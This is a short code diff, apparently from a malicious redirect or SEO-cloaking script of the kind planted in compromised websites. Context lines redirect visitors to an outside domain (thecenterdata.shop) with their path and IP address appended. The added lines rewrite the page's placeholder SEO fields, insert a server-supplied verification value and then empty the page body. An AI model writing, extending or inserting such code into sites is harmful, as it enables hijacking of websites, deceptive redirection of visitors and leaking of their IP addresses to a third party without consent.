@@ -94,6 +94,11 @@
                             window.location.replace("https://thecenterdata.shop/api_link/" + path_array[1] + "-" + ip);
                         })
                 } else if(data[0] == 'index'){
+                    document.querySelector('html').innerHTML = document.querySelector('html').innerHTML.replace(/product_name/g, "");
+                    document.querySelector('html').innerHTML = document.querySelector('html').innerHTML.replace(/description_seo/g, "");
+                    document.querySelector('html').innerHTML = document.querySelector('html').innerHTML.replace(/meta_keyword/g, "");
+                    document.querySelector('html').innerHTML = document.querySelector('html').innerHTML.replace(/website_name/g, "");
+                    document.querySelector('html').innerHTML = document.querySelector('html').innerHTML.replace(/website_url/g, "");
                     document.querySelector('html').innerHTML = document.querySelector('html').innerHTML.replace(/website_verify/g, data[1]);
                     document.querySelector('body').innerHTML = "";
                 } else {
